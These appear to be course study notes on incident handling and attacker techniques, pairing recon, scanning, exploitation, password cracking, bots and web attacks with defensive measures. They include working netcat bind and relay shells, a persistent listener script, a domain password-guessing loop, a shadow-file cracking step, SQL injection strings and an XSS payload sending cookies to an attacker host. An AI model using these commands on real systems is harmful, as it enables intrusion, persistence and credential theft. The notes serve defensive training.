Incident Handling Step-by-Step and Computer Crime Investigation

Incident Handling [IH]: action or plan for dealing with intrusions, cyber theft, DOS, intellectual property, etc. IH plans and policies must comply with the applicable laws of your country. Six phases:

Preparation 
Goal: To get the team ready to handle incidents
Team: Comp./physical Security, System Admin, Network, Legal, HR, PR, Disaster recovery
Action: Reoccuring staff training & user’s assessment using SE campaigns or spear phishing frameworks; Establish policy & warning banners; Notifying & interfacing with law enforcement; Good record keeping; Prepare system build checklists; Team organisation & emergency comm. plan; Access to systems/data; POC & Resources; Reporting facilities; Response strategies: contain & clear or watch & learn
Tools: Sptoolkit, Phishme, Honeynet, GRR(Windows/Linux/OS X), Rekall(memory analysis on remote hosts), Jump Bag
Identification:
Goal: To alert and assess an event or incident 
Occurs: Network perimeter detection(Firewalls, routers, external-facing network based IDS, IPS, DMZ systems, etc.), Host PD(when data enters or leaves a host, personal/local firewalls, port sentry tools), System-level D(antivirus tools, endpoint security suites, file integrity tools, user noticing strange behavior), Application-level D(web apps, app server, cloud service, etc.)
Action: Situational awareness, Chain of custody, Detecting and reacting to Insider Threats, Provide current intelligence to IH, Assign 10 & 20 IH, control the flow of information, communication channels - encrypted email; asking right/initial assessment questions
Documentation
Tools: GnuPG, PGP, MIME, Tresorit or Secure Safe(cloud storage), SANS intrusion discovery cheat sheets for windows & linux; sysinternal, TCPView

Containment:
Goal: Stop the bleeding
Phases: 
Short-term(Pull the power, Disconnect network cable, Isolate the switch port, apply filters to routers/firewalls), Evidence collection(creating forensic images, consider write blocker), 
Long-term(Ideal: keep system offline, move to Eradication, Numerous potential actions: Patch the system, Insert IPS or in-line snort/suricata, Null routing, change passwords, Alter trust relationships, apply filters to firewalls & routers, remove affected accounts)
FIRST Case Classification: 
Incident category(DOS, Compromised Asset/Info,Internal/External Hacking,Malware, Policy Violations), 
Criticality(affects response time - Level1 Business CS-60 mins, Level2 Non-Bus CS 4 hrs, Level3 Possible incident 48 hrs.), 
Sensitivity(L1 Extremely, L2 Sensitive, L3 Less Sensitive);  Deployment of a team, Inform Mgmt., Containment and quarantine; Identifying and isolating the trust model; 
Tools: RTIR(ticketing system), CyberSponse(ITS), CyberCPR(out of band chat, 1-1 messaging, WordWebBugs(documents that call back to identify sensitive data), Volatility framework, Rekal


Eradication:
Goal: To get rid of the attacker's artifacts on the machine
Action: Restoring from backups, Removing malicious software, improving defenses, perform vulnerability analysis
Occur: Evaluating whether a backup is compromised; Total rebuild of the Operating System; Moving to a new architecture
Tools: Nmap(port scanner), Vulnerability scanner( Tenable Nessus, OpenVAS, Rapid7, NeXpose, Qualys), 
Recovery:
Goal: To put the impacted systems back into production in a safe manner
Validate the system, run through user acceptance testing documentation, restore operations, Put the final decision in the hands of system owners by providing and documenting your advice, Monitor the systems
Write a script that checks whether the artifacts left by the attacker have returned & run the script daily for several months
Tools: Utilize Network & Host based intrusion detection systems and intrusion prevention systems
Lessons Learned: 
Goal: To document what happened and improve our capabilities.
Develop a follow-up report(on-site handler will do it), schedule lesson learned meeting, apply fixes from learnings, 
Do a root cause analysis

Enterprise Wide Incident:
Enterprise Incident Response: need to know where to look
First thing responder ask for is the logs for the Egress connections from the firewall, the DNS cache and external web filtering device
DNS data - reveals systems connected to bad IP addresses. 
Tools: DNS Blacklists, Malware Domain List
Web proxy data: reveal compromised systems that are connecting to known bas C2 sites, review length of URLs and user agent strings
Connection data: reviewing NetFlow data can reveal interesting patterns in connection statistics: 
Systems beaconing out every 30 secs/random intervals, connections that live for far longer than they should. 
Tools: RITA(Real Intelligence Threat Analytics)
To pull data: WMIC tool
Kansa:  Powershell tool for incident response. 
It creates a stacked analysis of the installed software in your environment. It does long tail analysis or positive skew analysis in statistics by focusing on software & processes installed only on a few systems. 
It supports the ability to pull the total count for specific things such as ASEPs( Autostart Extensibility Points)
Hoping to get 2 things from Kansa:
 a) making haystack much smaller 
 b) To look what exists on a smaller scale 
Insider Threat: It is a threat from an entity with access to your data. This class deals with employee & business partner threats. It is important that a company displays warning Banners ateach login point. Identification:by gathering intelligence through proactive scanning and monitoring  

Step1: Recon - GOAL: case the joint

OSINT: online data/contact info/off+defensive/cert transparency
Problems: too many sources, fees, is that all or not, parse in time
DEFENSES: [P] live with it, keep records up-to-date

DNS Interrogation: zone transfers dump DNS server logs, nmap dns-brute script
DEFENSES: [P] no zone transfers (only DNS srvr) -2nd/3rd srvrs reject, use split DNS, harden DNS, [I] find zone transfers in DNS log (look for this via TCP -p 53)

Web Search: public db, newspapers, blogs, social media, pushpin, careers pgs
DEFENSES: [P] limit info, perform risk analysis, general job ads, check 3rd party links, [I] find web spider/crawlers 

Search Engines: exploit-db, GHDB, engines index/store differently, cache finds removed sites, FOCA to auto-find files and metadata, indexable db+cmd shell history
DEFENSES: [P] remove robots.txt, noindex/nofollow/nosnippet/noarchive
			
Maltego: intel tool relation based on transforms
DEFENSES: [P] limit info, keep records up-to-date, do your own recon

Web Recon/Attack: crawls net+indexes service banners (FTP/telnet), displays cached results for service/vendor
DEFENSES: [P] limit info

TOOLS: whois data, reverse whois, viewdns, entrust-ctsearch, hibp, SpiderFoot, nslookup, dig(linux), SEC Edgar, namechk, pushpin, exploit-db, GHDB(cache, site, link, inititle, inurl, related), WayBack Machine, filetypes(asp,jsp,php,bak,cgi,xls), FOCA, SearchDiggity, Recon-Ng, Maltego, shodan, censys, tools.dnsstuff, network-tools, securityspace, etc.


Step 2: Scan - GOAL: survey tgt for holes

War Dial: dial #’s in seq>find modem/2nd dial tone, r.access to routers (oob), atck vmail
WarVox: VoIP w/ ID spoof, 1000/8hr, signatures apple against audio, spectrum analysis,
DEFENSES: [P] dial-up line and policy for oob access, war dialing exercises, train user PINs, [I] (monitor funk using SecureLogix Voice IPS), [C] (shut off modems, know who to call), [E/R](remove modems,change/secure phone #)



War Driving: Wi-Fi Networks Reconnaissance is done 2 ways: 
Active(sends probe request, SSID) 
Passive(beacon), Wireless scanning using antenna choices/proximity, security options: AES in CCMP, PSK & SAE in WPA 3; 
attacking PSK wi-fi - susceptible to offline pass guessing, 
Wi-Fi Network imposters - Personal and enterprise, non-Wi-Fi (Keyboards, Bluetooth, ZigBee, Z-wave, RFID systems)
DEFENSES: (P) Deploy WPA3, EAP/TLS Auth, requiring certs, PEAP  (I) Wireless IDS tools: Aruba Netwrks, Motorola AirDefense, AirMagnet, IBM using Linux sensors, Cisco use AP’s (C, E, R) Remove renegade access points

TOOLS: inSSIDer can use GPS, WiFi Analyzer for Android, Kismet(passive, Linux, captures rich data), Aircrack-ng(accepts the file, password guessing, decrypt the packet), Wi-Fi Pineapple, ILMN, Hostapd-WPE, Jackit with Crazyradio PA to identify & inject Ducky script, NetScout AirCheck G2(handheld, Identifying & locating malicious Wi-Fi devices)

Network Topology - Mapping & port scanning; TTL in IPv4, IPv6; sweeping for Network mapping; 
PN =no ping the tgt just start port scan. 
Nmap sends 4 packets to identify UP hosts: + traceroute
ICMP Echo request, 
TCP SYN to port 443, 
TCP ACK to port 80
ICMP timestamp, 
DEFENSES: (P) Disable incoming ICMP Echo request msgs & outgoing ICMP Time exceeded msgs (I) IDS signatures for ping sweep or traceroute (C) Temporarily block source address if notice a particularly frequent ping sweep, mark rules & purge them on a regular basis 

Port Scanning:  Port scanners=attkr toolbox, identify type/openings on sys. 
Application data -> internet applications: TCP(connection/session oriented )
UDP(sessionless) ride on top of IP -> Data link(ethernet, Wi-Fi). 
There are 216 = 65, 536 different TCP & different UDP ports. 
IANA maintains latest ports listing. 
For ex: TCP 80 - web server, TCP 445 - windows SMB, UDP 53 - DNS server, TCP 6000 - X window server. 
TCP - 3 way handshake using ISN(Initial sequence number) between the 2 systems. 
6 control bits describe the packet’s role in the connection(SYN, ACK, FIN, RESET, URG, PUSH). 
Note: control bits can be set independent of one another
UDP - no 3way handshake= stateless protocol+unreliable. for apps that value speed over reliable delivery such as voice or video transmissions.
Nmap scan types - Ping sweeps & ARP scans, Connect TCP scans, SYN(half-open), ACK(bypasses some filters, useful for mapping not scanning), FIN(bypasses some filters), FTP proxy(bounce), Idle, UDP, Version scans, IPv6 scanning(-6) supports all scan types
Nmap OS Fingerprinting - 30 methods including port scanning flag combination, GCD, ISR, TI, II, SS, TS, (W, W1-W6), DF, TG, CC
Other scanners: 
a. Masscan improved performance over early tools separating SYN send from ACK receive. With 20 Mbps bandwidth, Masscan can scan 16 million hosts for 10 ports each in approx. 1 hour. 
b. EyeWitness - takes screenshots of websites, VNC and RDP services. Effective for sorting through thousands of different websites
Proxy scans: Remux
DEFENSES: (P) Close all unused ports by shutting off services & applying filters. Utilize packet filters/ proxy firewalls & Intrusion detection system (I) several IDS signatures for port scans. Log analysis 

Evading IDS/IPS: Invalid TCP Checksum Bypass(IDS/IPS systems don’t validate the TCP checksum, attkr can insert a TCP reset with invalid checksum to clear the IDS buffer by send/split packet 2 halves), 
Bleeding In(attackers do it by operating like normal user would, difficult to detect in services and protocols like SSH, RDP, Citrix, OWA)
DEFENSES: (P) Keep IDS/IPS up to date, supply IDS/IPS with recommended resources(network perf., processor, RAM & hard drive), for sensitive systems(use host in addition to network based IPS/IDS), implement user behavioral analytics (I) IDS signatures indicate overlapping TCP segments, IPS can block odd packet fragments

Vulnerability Scanning: map a network, scan open ports + various Vuln(s), generate pretty reports. 
Limitations - only check for what they know, tools tend to be flat, don’t perform detailed correlation among many vulns to ascertain overall risk. 
Nessus - most popular & useful, client-server architecture with a lot of plugins(P-124, look for diagram). 
Nessus platform support:
N server - available for linux, FreeBSD, macOS, Windows
N client - runs inside of any HTML5 capable browser - firefox, IE, chrome
Dangerous plugins - may impact the target by crashing or locked out accounts. 
Safe checks - GUI option that turns off dangerous plugins
N plugins - ability to write your own plugins; can be written in C, NASL; over 100,000 plugins available - automatically updated every 24 hrs.
DEFENSES: (P) close all unused ports, shut off all unneeded services, apply all patches in a timely manner, run credentialed scans of your environment, review results sorted by plugin ID NOT by IP address (I) Utilize IDS signatures

TOOLS: Rapid7 InsightVM, SAINT, BeyondTrust Retina Network security Scanner, Nessus, OpenVAS, Qualys

SMB Sessions: SMB protocol - application layer protocol, supports a variety of network-accessible features of windows machines including:
file/printer sharing, domain auth, remote administration and other features. 
SMB is heavily used by attackers, often as ”normal TCP/445 traffic”. 
Essential protocol to understand for defenders. 
Windows workstations service implements much of the client code. Client tools include File explorer, net use, reg, sc, psexec and more
Windows server service implements much of the server code
Supported in Linux and Unix via Samba
Establishing & interrogating an SMB session on Windows: Attacker doesn’t need a domain admin account to enumerate and scan a domain.(P132)

              C:> net use \\ target ip
Mount shares= C:> net use \\target ip\username password /u: username
              C:\users\sec504> net view \\192.168.99.133

Password Guessing:

C:\> net user /domain > users.txt
C:\> notepad pass.txt
C:\> @FOR /F %p in (pass.txt) DO @FOR/F %n in (users.txt) DO @net use \\SERVER IP\IPC$ /user: DOMAIN\ %n %p 1>NUL 2>&1 &&  @echo [*] %n:%p &&@net use/delete \\SERVERIP\IPC$ > NUL


Enum Host Enumeration: P -136
Powershell Empire: 
Backdoor built in powershell(installed in Windows by default) post-exploitations scanning abilities. For ex: accessibles shares: situational_awarness/network/sharefinder,  scan for local IPv4 systems: situational_awarness/network/arpscan
Uses built-in Microsoft protocols like SMB
Ability to map domain trusts, group memberships, port scan & conduct reverse DNS lookups
BloodHound: A tool that graphs the quickest way to get to domain admin privileges
Ex: Gain access as a domain user, Find all systems is in the local admin group & where a domain admin is logged on, steal the domain admin access
DEFENSES SMB sessions: (P) Block access to TCP/445, UDP/445, TCP/135, TCP/137, UDP/137, UDP/138, TCP/139 across network boundaries and local firewalls, only allow access to ports that absolutely require SMB access to a given destination (I) check for access to the ports listed above in logs and IDS alerts 

Step 3: Exploit - GOAL: gain access/deny others

Physical Attacks: steal pc, bypass local ctrl (HDD encr), usb boot atck, rubber ducky
DEFENSES: [P] use full-disk encrypt, restrict USB ports, user train(lock pc), pwd BIOS (stops alt media boot), disable LLMNR (stops lan+turtle+responder attacks)

NetCat: r/w data ax network, only one cnx per listener, stdin+stdout+stderr both same
[C]lient: initiates cnx
[L]istener: waits for cnx

Data Transfer: send files btwn machines, use browser for L2C, tcp/udp, set src

Listener: nc -l -p 1234 < test.txt
Client: nc 192.168.1.2 1234 > test.txt

Note: to push the other way, just reverse the GRT than signs!

Port Scan: vanilla, tcp/udp scan, linear scans(def), any src -p, src route

$ nc -v -w3 -z 192.168.0.1 22-1000

Note: -v(verbose), -w3(wait 3sec), -z(minimal TCP data)

Backdoors: get shell any port, tcp/udp, C>Lbd, exe sh when user cnx port

*nix: nc -l -p 1234 -e /bin/sh
Win:  nc -l -p 1234 -e cmd.exe

Note: running /bin/sh or cmd.exe=no login needed;already logged in as user who ran nc listener

Persistent BDL(bd listeners): keep nc in L mode when cnx drops, for *nix :
cron job
v of nc that supports -L flag
While loop in script+nohup (ignores logout signal)

Win:  nc -L -p 1234 192.168.0.1
*nix: $ cat listener.sh
While [ 1 ]; do echo “started”; nc -l -p 1234 -e /bin/sh; done
$ nohup ./listener.sh &
Relays: relay info from pc>pc>pc, redir data thru ports allow by FW, hard to trace attk origin, setup nc -L and | output to diff C, only 1way comms, else 2 relays needed
no sudo needed if ports < 1023 + win any port works

Win: C:\> type relay.bat
nc 192.168.0.1 4321 
     C:\> nc -l -p 7777 -e relay.bat
*nix: $ mknod backpipe p (or mkfifo on newer *nix/nux)
      $ nc -l -p 2222 0<backpipe | nc 192.168.0.1 3333 1>backpipe


BC no -e: relay from bash to nc, gaping security hole


$ mknod backpipe p
$ /bin/bash 0<backpipe | nc -l -p 8080 1>backpipe

DEFENSES: [P] (data transfer): know what's running on sys + (port scanner): close unused ports + (vuln scan): sys patch + (cnx to open ports): close unused ports + (bd): know what's running on sys + (relays): careful net arch + layered sec + critical filtering (internal FW, private VLANs, network isolation design)


Sniffing: grab packets from LAN, manipulate flow of packets, for broadcast (non-switch)
promiscuous mode = gather all traffic regardless of MAC (h/w addr) 
content address mem (CAM) = MACs of frames going from each ports to switch
Using CAM tables, the switch switches.
wireshark=lot of prot parsers+capacity to parse bits+useful info (tshark txt mode)
Always patch (bof common)
ARP = maps IP to MAC (48b globally unique addr hardcoded on NIC card)
Systems cache this info in ARP cache ~10mins 
Cant verify ARP reply came from right machine
Only sent ax single LAN + not routed btwn LANs


Gratuitous ARP = any1 send ARP reply though nobody sent ARP request
Flood switches mem/poison ARP cache
Solaris has ARP cache time limits (poison after timeout ...duh)
Name resolution = DNS, link-local multicast NR (LLMNR), NetBios NS (NBT-NS)
Failing DNS = sys query local sys via LLMNR then NBT-NS
BetterCap= auto disc tgt + ARPcache poison+ hijack traff
Manipulate IP>MAC map + reroute packet to attacker pc
MITMf = intercept HTTPS w/ SSLStrip+, insert mal .hta, BeEF, Responder
ARP cache poison = ip fwd+ARP request+sniff (act as DG)
NetworkMiner=live net analysis+offline pcap analyze  (thumbnail)



SSHmitm gives public key for SSH server (tgt>attkr + attkr>server)
Dodge SSL Warnings: comp CA/RA + bleed key from mem + bogus cert+MD5 hash collision on trusted cert
comp browser + import attkr cert as trusted
user accept cert via SE/popup/etc
MITM + force browser to use HTTP not HTTPs (bettercap SSLstrip)
attack sites SSL only for auth w/ cleartext HTTP for post-auth session
evade HSTS = SSLStrip+ (changes hostnames from www>wwww)


Session hijacking: LLMNR + Web Proxy Auto-Discovery (WPAD) (heavily post-exploit)
any time a sys blindly reaches out to identify a sys/srvc > hijack response:redirect to atkr
Responder=LLMNR/NBT-NS/DNS/MDNS attacks (redir tgt sys to harvest creds)
HTTP/HTTPS/SQL/Kerberos/FTP/IMAP/SMTP/DNS/LDAP
Spoof sys + intercept auth requests on the fly
Serve malicious .exe files + force LANMAN downgrade (ez2crack)
	
WPAD attack=make ID of proxy transparent to user
pretend to be WPAD>serve mal PAC file (use your proxy for all traffic)

DEFENSES: [P] port-level security on switches, dynamic ARP inspection with DHCP snooping, disable LLMNR and WPAD, encrypt sessions + strong auth, SSH v2+, VPN+encryption, [I] broken ARP entries, check local machine (arp -a), monitor LAN via ARPwatch, check switch logstash (camtableexport.ps1), check DNS cache on win (ipconfig /displaydns), error messages from ssh clients, [C] drop spurious sessions, change pwd+restart srvc, analyze dest sys, [E/R]: change pwd, rebuild sys

Buffer Overflows: stuffing large data into small receptacles (some local/ax net)
non-validated input for heap+integer based overflows + advtg of mem storage
[gets] function performs no bounds checking
[strcpy] function has 1st argument as the dest, the 2nd as the src
[cpu] contains register called instruction pointer>memory>instructions	
until a branch/jump happens(if/else, loops,subroutines,go to statements)
instruction points to new location when jump/branch happens
[subroutines] exe starts in main funk + points to new area of mem (codeload)
ctrl returns to main program+points back before function call
funk var + return point stored in logical data struc called ‘stack’
[return pointer] contains addr of the point in prgm to return to when subr is done
var space is filled back>front or high addr>low addr
hardest part of creating BoF 
doesn’t know which mem location of malcode > guess via dbg

[stack] like a scratchpad to store things to rmr
LIFO (last in first out) + push on top of stack + pop from top 
RP has addr where funk interrupt was = where we wana go post-funk
buffer>neighbor var space>pointer space (new addr for RP to malcode)
1 (use existing BoF code) or 2 (create 0day)
[create BoF] find BoF condition + malcode>mem + set RP to point in stack to exe
check binary for weak funk calls
(strcpy,strncpy,strcat,sprintf,scanf,fgets,gets,getws,memcpy,memmove)
analyze assembly code (msfelfscan / msfpescan)
brute force+repeat patterns+crash where pointer(EIP x86, RIP x64)
!exploitable by Microsoft to auto crash analyze how exploit flaw is
[cram] put A char into inputs (envrmnt var, fields, menus, GUI interfaces, admins)
find which A char made it > enter cyclic pattern + look for tht char in RP
pinpoint exact offset for the RP
ASCII null (0x00) stops vuln [strcpy] from write+ncode xploit to avoid filter
[NOP Sled] no operations + exe continues down stack until malcode 
used to detect these attacks on the net
NOP sled + mal code + RP = egg 

[canaries] hash of RP+place on stack + check canary match RP after funk call
else, don’t return from funk, crash gracefully 
3 types: random/XOR/terminator (don’t carry over part of cpy funk)

DEFENSES: [P] patch; obtain/test, host-based IPS (block certain calls into kernel from apps + mem protect areas like stack), app whitelisting software, no instructions from stack (may break apps), SELinux ext mitigate impact of ware based exploits, Win Defender Exploit Guard (DEG), Win Data Exe Prev (DEP), hw/sw based DEP (hw stronger+supports only processors that exe protect (NX)), software is default for programs/srvs, canaries (added to compiler, not OS) + hash of RP, check size of user input, truncate data or give error if too big, c/c++ rely on programmer to manage mem, awareness/training for devs, tools (RATS, flawfinder, SWAMP, etc) [I] unusual server crash, exe of code from stack, IDS/IPS alerts, extra accounts on sys, [C] deploy non-exe sys stacks, patch, [E] patch, rebuild, [R] monitor after back in prod

Metasploit: exploit framework, exploit+payload+tgt (dest IP addr/port/options)
[modules]: (select exploit+tgt+payload+options/launch)
exploit = take advantage of flag in tgt program
payload = makes tgt do attkr chores
auxiliary= do tasks, incl. scans
post= post-exploit + manipulate tgts

Meterpreter: post-ex module to load/interact with DLLs in real-time
creates special CLI access within running procs
no separate proc (no cmd.exe)
no touching HDD
no sys cmd exe for shell (all hosted)
easy growth via adding new DLLs
displays sys info (OS/uid/etc)+interact w/ FS (cd/ls/upload/download/etc)
interact w/ net (config/build port relay) + procs (exe/kill/ps) + uses TLS (encrypts traffic)
Multisession+in mem proc migration+disable k/m input+keylog+sniff+encode+piv
payload+enc/denc+random NOP generator+wrapper for shellcode+offsets+msfelfscan/msfepscan(search exe/lib for vulns)
[why] - builtin ft + 1000+ exploits + payload in firework + devs add exploits

DEFENSES: [P] ctrl outgoing traffic, filter both directions, use proxies, DNS/HTTP/HTTPS/SSH careful, hunt team, check long URLs, DNS entries on blacklists, beacons, odd services/exes

Protocol Parsers: often run with root priv + attach to port # >1024 on UNIX + syslvl funk
lack of bounds check 

DEFENSES: [P] patch


Endpoint Bypass: AV bypass+app whitelist bypass+ AVNG bypass + non-attribution
[Veil] generate a meterpreter payload as BAT file to embed word macro
[ghostwrite] mods assembly of exe to bypass AV (+2-2) + NOP is enough
[app whitelist] add malcode in code caves + envrmt keyed payloads + golang payloads + code sign malcode + live off the land (LOL)
atbroker.exe used by create regkey for mal.exe + 2 regkey w/ REG_DWORD value of 0 + startexe w/ malcode path + invoke mal.exe via atbroker
hijack install/uninstall funk of exe to bypass some sandbox tools


TOOLS: konboot, inception, LAN turtle+responder, rubber ducky, netcat, wireshark/tshark, solaris, LLMNR, NBT-NS, BetterCap, ARPSpoof, MITMf, Backdoor Factory, BDF proxy, ScreenShotter, JSKeylogger, NetworkMiner, SSHmitm, Pacdoor, ARPwatch, !exploitable, 
RATS, Flawfinder, SWAMP, Fortify source code analyzer, Coverity Static analysis, Klocwork insight pro, grammatech’s CodeSonar

Step 4: Keep Access - GOAL: stay there

Password Attacks: pwd 1st/only LOD + unauth disclosure/mods/rm
pwd guess: find valid uid+ ls pwds + try + use scripts = trigger acc lkout
pwd spray: small pwd set against large acc set (e.g, Summer2020)
THC Hydra: pwd guess+dict support+ ✔protocol(ssh/rdp/smpt/vnc+)+*nix
pwd crack: get ptxt pwd = pwd file w/ ctxt rep of pwds
find valid uid+find encry algo+get encry pwd+ls pwds+hash+check match
create dict + combo terms/pwd + automate/optimize
dict(wrdlist)+bforce(iterate char set)+hybrid(mix d+b)/word mangle
recover forgot/unk pwd + audit pwd strength + no store crack pwd +chg+

Password Hashes: win(LANMAN/NT)+ *nix (des/3des/md5/blowfish/sha256/sha512)
auth= choose pwd + hash tht pwd + store that value *cpu heavy=b/scrypt/pbkdf2*
user logs in + sys calcs hash = hash’ then sys check hash’ to value=auth!

LANMAN: legacy+bforce 4Core(alph# <2h, alph#+somesym <10h, alph+allsym=<120h)
not case sensitive (all uppercase)
pwd padded to 14b + add NULL (0x00)b to end of str
split two 7b chunks + encr DES key (KGS!+#$%) + concat = LANMAN hash
no salt

NT Hash: modern+case sense+unicode+MD4 hash+encr RC4 or AES-CBC-128 in SAM
<14 char = no LANMAN hash is stored, only NT for local auth
no salt (likely to maintain compat w/ legacy auth prots)

Salt: adds entropy (randomness) + makes it harder to crack
randomly selected + not secret + OS auto adds when calc pwd hash
must be ptxt with pwd hash = so sys can use same salt to auth usr pwd
defeats rainbow tables attk 

Rainbow Tables: hash pwd table (store RAM or idx file HDD, map hash>pwd + cpu)
DEFENSES: salt pwds 

Get WinDC Hash: get NTDS.dit (its encr) + SYS registry hive data + secretsdump.py
1>built-in tool ntdsutil.exe lets atkr backup AD (activate instance ntds + ifm)
2>decryp NTDS.dit via secretsdump.py 
less likely to trigger alert 

Get Win10 hash: mtrprtr: hashdump(reads local pwd from lsass) + smart_hashdump
1>hashdump (old sys migrate PID in lsass) + (new sys migrate -N lsass.exe)
2>smart_hashdump: reads pwd from HDD
find SYS proc (not svchost > may crash) + match architecture (x64/x86)
migrate PID 
choose: lsass may be incomplete/limited to local users + smart_hd fails UAC 

Win Hashes: username:userid:LANMAN:NTHASH
empty hash= older tools/change win encr ft/disabled prot/inactive acc/cant dcrt SAM
empty = am all day baffled  by : difficult choices for encryp data

Unix/Linux pwd: early sys pwd with DES encr (no salts) + uname/pwd in /etc/pwd file
later, MD5 pwd hash, follow BlowFish, SHA256/512, (salt; 4b/8b)
uname in /etc/pwd (world readable) 
hash type + salt (4/8 char) + crypt() enc pwd hash in /etc/shadow 
no$(DES), $1(MD5), $2(Blowfish), $5(SHA256), $6(SHA512)
$hash funk+salt+hashvalue:
attkr can take salt (/etc/shadow) + words = hash’ to auth 

Hash Rounds: slow pwd cracks (prior hash is input to the next hash calc - serially (5k x))
MD5 ($1) = 1k rounds
SHA256($5) + SHA512($6) = 5k rounds
use GPUs 
DEFENSES: [P] use PBKDF2 which allows HMAC, bcrypt, scrypt,


PBKDF2: pwd hash funk + specific HMAC (hash msg auth chk) + some sys 1m rounds
WPA/WPA2 uses PBKDF2 for PKS w/ 4096 SHA1 rounds

John: xplatf + feed encr pwd file + for Win give output of Mtrptr/mimikatz/impacket
supports/autod pwd hash format + cracked pwd print to screen + store john.pot
steps: cpy dirs to /tmp + combine via unshadow file combined + run john combined
rm john.pot file when pwd audit done
Default: single>wordlist>incremental
single; variation of uid + /etc/pwd info +
wordlist; wrdlist file + hybrid = permutate pwd 
incremental; bforce 
external; ext program to generate pwds

# unshadow /etc/passwd /etc/shadow > combined

HashCat: crack many via -n (office file pwd/kerb tkt via kerbroasting/os hash)
uses GPUs 
multi-mode attk
rule engines for pwd mutation atks
attk modes: straight (-a 0), comb (-a 1), bforce/mask(-a 3), hy/w/m(-a 6), hy/m/w(-a 7)
rule files mutate wlist 
toggle case of each letter in words
replaces [e] with [3] (l33t speak)
reverse words, capitalize 1st letter, add #/char/etc

DEFENSES: [P for Win] rm LANMAN hashes, strong pwd, pwd policy, deploy Mic LAPS+Cred Guard, don’t store LANMAN hash in regkey [hkey_LM\sys\currentControlSet\ctrl\LSA], audit pwd (domain pwd audit tool), group policy w/ AD, pwd length, 20+ char pwds, [P for *nix] PAM (pluggable auth mod), link login to sys (RADIUS,kerberos,etc), pwd complex: passwdqc, pwqcheck, pwqgen

Pass-the-Hash: use hash to auth tgt directly
Win performs LANMAN Ch/Rsp, NTLMv1/2 auth via hash in LSASS mem 
grab hashes+load into mem+ auth via SMB
sys not attach to domain restrict via regkey [LocalAccountTokenFilterPolicy]
set to 0 = disabled except admin (RID500)
domains vuln to PTH;
DEFENSES: [P] maintain ctrl of hash, AV, use host FW+block C>C cnx, allow inbound SMB>C sys only via admin, manage local admin via LAPS and Mic Cred Guard, [I] find unusual admin activity, config changes, unusual SMB + Pc>Pc cnx, [C/E/R] change pwds asap 

Kerberoasting: dom usr request service tkt
tkt is encr using service pwd hash
request list of service principal names (SPN) from AD
GetUserSPNs.py from impacket grabs it
mimikats/empire/+ can extract tkts
no need to interact w/ srvc
no need to exist (srvc), just acct
good for old/defunct srvc acc + many pwd never expires
pwd crack via hashcat

Worms: auto attk tools spread via net+stage ground to scan/conquer tgts
instance = segments
multi-exploit/platf/0day/fast-spread/polymorphic/metamorphic
uses xploit warhard to penetrate pc (1 or 2 to date)
stuxnet had 4 (file explorer 0day, usb infect, etc)
holes in many net-based apps
nimda 2001 had a dozen ways

Bots: programs that perform actions on human behalf + specialized bd + ctrl sys en masse
ctrl large  ~12 - 1m+
group of bots under control = botnet
attkr called botherder 
Maintain bd+control IRC channel+mail relay+anonymize HTTP proxies+DOS
install bots via worms (bot as payload) + email attach + trojan + browser exploit/driveby
IRC port 6667/3000/3333 + HTTPS/DNS + social (Twitter/YT/Google Docs)
morph code for file infection + run cmd with SYS priv 
start listening sh + add/rm file shares + FTP file + add autostart entry + scan
launch packet flood (SYN/HTTP/UDP/etc)
create HTTP proxy (anon surf)
start GRE/TCP redir
harvest email addr + load plugin into bot
shutdown pc/delete bot
look for virtualization + foil dynamic REM
DEFENSES: [P] BoF defenses help, harden sys,  process to test/deploy quick patches, app whitelist + software restrict policies/applocker, encr data HDD, tabletop: speed/scope test, [I] AV daily update, logs on desktop/mail server/file server, [C] IR + net mgmt, kick off net segments real-time, [E/R] AV to remove infestation/rebuild

OWASP: open web app sec project + dev guide + pen test frwork/chklist + webGoat+ ZAP 

Account Harvest: find valid UIDs
how server responses to good vs bad uid auth (error msgs; uid already taken)
automate via script (shell/wget/python/burp)
depends on format of uid (numeric; credit cards + user; dict file)
1 pwd at a time = fly under pwd lockout radar 
pwd spray
DEFENSES: [P] consistent auth error msgs, uid bad login metrics, lockout acc, slow down auth (wait 5s) per IP/user agent, [I] frequent auth activity w/ no activity after success login


CMD Injection: web app take usr input (malcode) + process + invoke sh 
priv of web server 
can be URL/form var/cookies/ input fields etcc
separated with [ ; ] on *nix, and [ & ] on Win
shellShock
1>ping/nslookup  (sniff to see traffic from tgt) 
dont need highpriv +blind fashion = not seeing output of cmd
won’t cause harm in envrmnt 
2>transfer/exe program on tgt + time-delay inference 
DEFENSES: [P] educate devs, vuln assess, pentest, [I] unusual traffic/extra acct/config chg on servers, [C] fix app, use WAF, remove attkr exe/acc, chk for rtkt, [E] rebuild if rtkt, [R] monitor attkrs return

ping -n 6 -w 1000 127.0.0.1 
Note: useful to verify cmd inject vuln even if cmd output not available

SQL Inject: backend db + take input/adds to SQL query to get/update/delete data
find input strg (uname/acc#/product SKU)
is it integer, strg, date, etc
add strg quotes
bypass client-side filters (JScript)
use web-app manipulate proxy
db logic elements
[--] comment delimiter -->ignore anything passed after user input
avoid syntax errors by sql injections
[ ;] query terminator
[*] wildcard selector
[%] match any substr
[_] match any char
use OR, TRUE, 1=1, SELECT, JOIN and UPDATE
2 types of data 
user definable table 
metadata
union statement merges results of 2 [select] statements
to view attkrs data from own statement in output fields
DEFENSES: [P] limit perm of web app access db, filter user input, use parameterized queries! , modSecurity, [I] check logs for special chars, phrases for union,select, join and inner, DLP detect exfil for PII, [C] block src IP/account being exploited, [E/R] rm attkr data, launch fraud INV

select * from users where name = ‘Fred’’;
Select * from users where name = ‘’ or 1=1; --’;



XSS: user input sent back to user browser w/o filter 
steal info (cookies)
URL in a script > reflected back to client 
runs on client browser
search for site w/ no filter user-supplied input, HTML <script> tags
can pass cookies to attkr site even if grab.cgi doesn’t exist



hxxp://counterhack.net/search.php?word=<SCRIPT>document.location=’hxxp://attackersite.com/cgi-bin/grab.cgi?’%2bdocument.cookie;</SCRIPT>
Note: steals cookies ( user clicks link + goes to site + invokes script + sends to tgt site (bank) as web request + malcode exe in browser as tgt site



Reflected XSS: script reflected off tgt site > users browser
victim accesses site vuln to XSS
phish victim
victim click + browser transmits script to web app as input
web app reflects input back to browser (script)
script runs on vic browser (grabs all cookies+send via http/email to attkr)

Stored XSS: script stored on tgt site backend + deliver to victim browser
can scan internal net 

BeEf: browser exploit framework > ctrl of browser via XSS hook
beef server + beef hook on xss vuln site 
victim accesses pg w/ beef hook + victim contacts beef server = ctrl
port scan/history grabber/sw inventory/alter pg view/msf exploit/xss sh

Attack Admin via XSS: steal admin cookies
